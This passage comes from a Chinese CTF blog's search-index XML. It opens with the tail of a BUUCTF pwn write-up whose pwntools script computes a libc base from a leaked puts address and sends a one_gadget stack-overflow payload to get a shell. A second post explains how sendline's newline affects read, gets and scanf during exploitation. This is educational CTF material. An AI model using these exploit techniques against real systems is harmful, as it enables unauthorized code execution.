class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">#yuancheng 0x4527a</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4527a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bendi</span></span><br><span class="line"><span class="comment">#one_gadget=libc_base+0x4f302</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">3</span>+p64(one_gadget)+p64(<span class="number">0x602400</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220331215347474-154784131.png" alt=""></p><p>ps：最后值得一提的是，这两个exp，第一个最后是并没有执行两次leave;ret获取shell的，而是执行了一次leave就获取了shell，第二次则需要执行两回leave;ret才能获取shell。经过调试，我还是没有发现这种差异的根本原因是在哪里。如果各位师傅有弄的这个问题的，还请告知我这个菜鸡。</p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
            <tag> MD5加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>探究pwntools中sendline的回车所造成的影响（什么时候用sendline，什么时候用send）</title>
      <link href="/posts/9fda4edb.html"/>
      <url>/posts/9fda4edb.html</url>
      
        <content type="html"><![CDATA[<p>在pwntools中，sendline和send都是发送数据，但是sendline是发送一行数据，换句话说就是sendline会在发送的数据末尾加一个回车。而<strong>这个回车所造成的影响，是跟对应的输入函数有关系</strong>，在做pwn题中，碰见的输入函数有scanf（“%s”)，gets()，read()，fgets(),这四个函数。我感觉最常见的应该是read函数。<strong>我们分别讨论一下这前三个函数在读取内容上的具体细节以及sendline所造成的影响</strong>。</p><h1>read函数</h1><p><u>read(fd, buf,  count) fd是文件描述符，你可以通俗理解为从哪读；buf是一个指针，你可以理解为读到哪，count就是读入字符的数量。</u></p><p><font color=red><em><strong>read的内容都是从缓冲区中读取的</strong></em></font><br>如果read的fd是0，也就是说read的内容，都要从输入的缓冲区中读取。（0在文件描述符中代表着标准输入）这里要注意，<strong>读取的内容不是直接被输入到了指定的地方，而是不管你输入了多少内容，即使超过了count的限制，</strong><font color=red><strong>也依旧输入到了输入缓冲区中</strong></font><br>只是read函数没有把输入缓冲区中超过count限制的后面的内容读到指定的buf而已，**也就是说此时输入缓冲区里面依然存在多余的内容。**同样，<font color=red><em>也就是说如果你输入的内容是伴随着你按下回车结束，并且此时输入内容的长度还小于read函数的count那么这个回车也会被读取到read指定的第二个参数中</em></font></p><p>我们现在来分情况讨论read，它只有三种可能<br>第一种情况，<em>read的第三个参数大于了实际输入的内容的字节数</em><br>那么此时，<strong>输入到缓冲区的内容都被读取到了read第二个参数指定的地址</strong>，这里就要注意，我们用sendline发送是数据就相当于在原本的发送的数据结尾再加上一个回车。在pwn题中，大多时候read第二个参数指定的地址都是写到了栈里面<font color=red><em><strong>也就是说不仅仅read会把你输入的数据存入栈中，还会把这个回车（ASCII码也就是0a）存入到栈中，</strong></em></font>当然你可能大部分时候，都不会对那个存入0a的内存单元进行操作，因此是不影响我们获取shell的但事实上，此时的回车已经影响到栈中数据，<em><strong>我们平常使用sendline可能没有因为这个原因受到影响，仅仅是我们没有用到那个被0a影响的数据而已</strong></em>。<u>我们可以看到下面这个图片①处没有0a(回车)②处有0a③是正常的栈空间的内容④可以看到原本正常的内容，可最后的末尾却被覆盖成0a了</u>。最关键的就是在BUUCTF的pwnable_start这道题，这个被干扰的数据，我们还需要使用，因此在这里面对read函数的时候不可以用sendline，只能使用send。<br><img src="../img/2706180-20220129192231393-1289193521.png" alt=""></p><p>第二是，我们输入的字节数，等于了count的字节（不包括回车）。<br>这就意味着，我们的数据时可以正常存入到指定的地址的，也就是说即使我们使用sendline栈中也并不会写入0a。但，这就可以高枕无忧了么？别忘了，**我们输入的数据先是放入了缓冲区中，再从缓冲区中写到了指定的地址，虽然sendline的回车没有被写进去，但是回车停留在了缓冲区中。**接下来如果有gets函数需要获取输入的话，<font color=red><em><strong>gets函数会因为这个缓冲区里的回车直接结束，不会从用户这里获取输入。</strong></em></font></p><p>第三是，我们输入的字节数，超过了count的字节，此时用这个实验来解释，再好不过了</p><p><img src="../img/2706180-20220129192252767-1481032805.png" alt=""></p><p><em>可以发现输入了20个1，但由于read只能从缓冲区里面接收16个字节，因此执行完read函数之后，它的缓冲区里面还剩4个1和一个回车。但由于scanf的性质是，从缓冲区里面读入内容，遇见空白符停止，并且不读入空白符，因此a的内容是4个1。最后由于缓冲区只剩了一个回车，被gets读到之后，把回车丢弃了，因此直接声明了gets的结束，并且gets什么都没有读到</em>。<strong>因此当输入的字节数，超过了第三个字节的参数，就如同第二种情况一样，多出来的内容都会停留在缓冲区中（包括回车，这个回车用sendline发送payload，才会有回车）</strong></p><h1>gets函数</h1><p><em>使用 gets() 时，系统会将最后输入的换行符（也就是回车）从缓冲区中取出来，然后给舍弃，因此缓冲区中不会遗留换行符</em>。gets函数尽管会溢出，但是由于它会把自身发送的回车给从缓冲区中丢弃，<strong>因此遇见gets函数，就不用考虑sendline和send的区别。但是吧，面对这个函数，你不用sendline还不行，因为它需要回车来声明你输入的结束，尽管它会把\n丢弃</strong>。并且值得注意的就是，如果当gets溢出的话（我指的是数组溢出），那么它会在你发送所有数据之后会在最后填上一个00，如果不溢出的话，就不会出现这个00。使用gets输入的字节，正好和创建数组的大小一样的话，也会溢出（可能是因为回车的原因，尽管丢弃了，但还是会在输入的字符串结尾填上一个00），也就是说，如果用gets输入溢出数组的话，它会和read的第一种情况一样，把00写入栈中，也会干扰栈中数据。</p><h1>scanf函数</h1><p>而scanf(‘%s’,c)的时候，<strong>scanf是从第一个非空白字符（空格 换行 制表符）开始读入的，就是你输入的数据，在按下回车的之前，<font color=red><em>输入的数据都会被存储在输入缓冲区（包括回车）</em></font></strong>，当按下回车键之后，scanf就会开始<u>从输入缓冲区里面读取数据</u>，把读取的数据都传送到你指定的地址，直到遇见了空白符<br>然后停止。<font color=red><em><strong>它仅仅是遇见空白符停止了，但是空白符以及空白符后面的内容依然在输入缓冲区里面。</strong></em></font></p><p>如果再遇见gets函数的话，gets函数会从缓冲区里面继续从空白符开始读（空格），然后遇见了回车停止，并把回车丢弃，此时我们根本无法用gets函数输入，因为它在缓冲区里面就遇到了换行符。用下面的图片举例</p><p><img src="../img/2706180-20220129192309307-314700424.png" alt=""></p><p><img src="../img/2706180-20220129192327106-1249123632.png" alt=""><br>scanf函数也存在溢出，如果对它用sendline发送数据的话，是不可能被回车（0a）所影响栈中数据的。但是吧，通过实验发现，面对scanf的时候，不用sendline还不行，必须要用sendline，send发送的话，会在执行scanf的时候卡住。因此面对scanf(“%s”)的时候，我们用sendline发送，时刻要注意它的回车会留着缓冲区里面，可能影响接下来程序的执行情况。</p><h1>总结</h1><p><strong><u><em>使用sendline的结果取决于输入的函数</em></u></strong></p><p>如果是read函数的话，<font color=red>①只有当count的字节数大于你所输入的字节数，这个回车才不会产生任何的影响，而多出来的回车也会被当成输入数据正常存入栈中（如果输入的地址是栈的话）；②当count字节数等于你所输入的字节数，那么最后的sendline的回车会停留在栈中（没有在缓冲区中），此时它是不正常存入，因为这个回车的缘故，已经造成了溢出；③当count字节数小于你所输入的字节数，那么没有输入进指定地址的内容，都会停留在输入缓冲区，有可能会影响之的输入。<strong>但值得一提的是使用read函数，我们可以用send来发送数据，这样就可以确保万无一失</strong>。（</font><strong>如果是gets函数或者scanf函数</strong>，我们没有办法选择，<strong>只能使用sendline</strong>，这两种函数只有遇见sendline发送的回车，才会停止读入。<strong>gets函数会清空缓冲区里的回车，而scanf则不会清空回车。因此scanf可能会因为没有清空回车的缘故，对之后的程序输入可能造成影响，但是如果gets函数溢出了数组限制的话，会异常的在输入的字符串结尾填上一个00存入栈中。此时的00也有可能会覆盖原本栈中的数据</strong>，另外就是遇见fgets的话，也是没的选，只能用sendline</p>]]></content>
      
      
      <categories>
          
          <category> 探究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 探究 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
